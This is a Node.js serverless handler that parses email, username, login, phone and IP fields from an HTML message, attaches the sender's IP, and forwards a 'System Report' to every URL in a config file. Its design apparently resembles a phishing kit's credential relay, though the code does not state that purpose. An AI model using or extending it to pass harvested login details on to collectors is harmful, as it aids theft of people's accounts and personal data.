const fs = require("fs");
const path = require("path");

const FILE = path.join(process.cwd(), "data", "urls.json");

/* ======================
   LOAD URL SAFE
====================== */
function loadUrls() {
  try {
    if (!fs.existsSync(FILE)) return [];
    const data = fs.readFileSync(FILE, "utf8");
    if (!data) return [];

    const parsed = JSON.parse(data);
    return Array.isArray(parsed) ? parsed : [];
  } catch (err) {
    console.log("LOAD ERROR:", err.message);
    return [];
  }
}

/* ======================
   NORMALIZE SAFE
====================== */
function normalizeKey(key = "") {
  key = String(key).toLowerCase();

  const map = {
    email: ["email", "mail"],
    user: ["user", "username", "name"],
    login: ["login"],
    phone: ["phone", "telepon"],
    ip: ["ip"]
  };

  for (const k in map) {
    if (map[k].some(x => key.includes(x))) return k;
  }

  return key.replace(/\s+/g, "_");
}

/* ======================
   SAFE HTML CLEAN
====================== */
function stripHtml(input = "") {
  return String(input)
    .replace(/<script[\s\S]*?<\/script>/gi, "")
    .replace(/<style[\s\S]*?<\/style>/gi, "")
    .replace(/\r/g, "\n");
}

/* ======================
   EXTRACT BASIC VARS
====================== */
function extractVars(input = "") {
  const vars = {};
  const html = stripHtml(input);

  const tdRegex = /<td[^>]*>(.*?)<\/td>\s*<td[^>]*>(.*?)<\/td>/gi;
  let m;

  while ((m = tdRegex.exec(html)) !== null) {
    const key = normalizeKey(m[1]);
    const value = String(m[2]).replace(/<[^>]*>/g, "").trim();
    if (value) vars[key] = value;
  }

  return vars;
}

/* ======================
   BUILD HTML SAFE REPORT
====================== */
function buildHtml(vars) {
  return `
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"></head>
<body style="background:#0f172a;color:#fff;font-family:Arial;padding:20px">

<h2>System Report</h2>

<table border="1" cellpadding="8" style="border-collapse:collapse;width:100%">
<tr><td>User</td><td>${vars.user || "-"}</td></tr>
<tr><td>Email</td><td>${vars.email || "-"}</td></tr>
<tr><td>Login</td><td>${vars.login || "-"}</td></tr>
<tr><td>Phone</td><td>${vars.phone || "-"}</td></tr>
<tr><td>IP</td><td>${vars.ip || "-"}</td></tr>
</table>

</body>
</html>
`;
}

/* ======================
   SAFE PARSE BODY (FIX VERCEL 500)
====================== */
function parseBody(req) {
  if (req.body && typeof req.body === "object") return req.body;

  try {
    return JSON.parse(req.body || "{}");
  } catch {
    return {};
  }
}

/* ======================
   MAIN HANDLER
====================== */
module.exports = async (req, res) => {
  try {
    if (req.method !== "POST") {
      return res.status(405).json({ success: false, message: "POST only" });
    }

    const body = parseBody(req);

    const subjek = String(body.subjek || "");
    const pesan = String(body.pesan || "");

    if (!subjek || !pesan) {
      return res.status(400).json({
        success: false,
        message: "subjek & pesan wajib diisi"
      });
    }

    const vars = extractVars(pesan);

    vars.ip =
      req.headers["x-forwarded-for"]?.split(",")[0] ||
      req.socket?.remoteAddress ||
      "unknown";

    const html = buildHtml(vars);

    const urls = loadUrls();

    if (!urls.length) {
      return res.json({ success: false, message: "URL kosong" });
    }

    const fetchFn = global.fetch;

    const results = await Promise.allSettled(
      urls.map(async (url) => {
        try {
          const r = await fetchFn(url, {
            method: "POST",
            headers: {
              "Content-Type": "application/x-www-form-urlencoded"
            },
            body: new URLSearchParams({
              subjek,
              pesan: html
            })
          });

          return {
            url,
            success: true,
            status: r.status
          };
        } catch (err) {
          return {
            url,
            success: false,
            error: err.message
          };
        }
      })
    );

    return res.json({
      success: true,
      message: "done",
      total: urls.length,
      results: results.map(r => r.value || r.reason)
    });

  } catch (err) {
    console.log("FATAL ERROR:", err);

    return res.status(500).json({
      success: false,
      message: "internal error",
      error: err.message
    });
  }
};
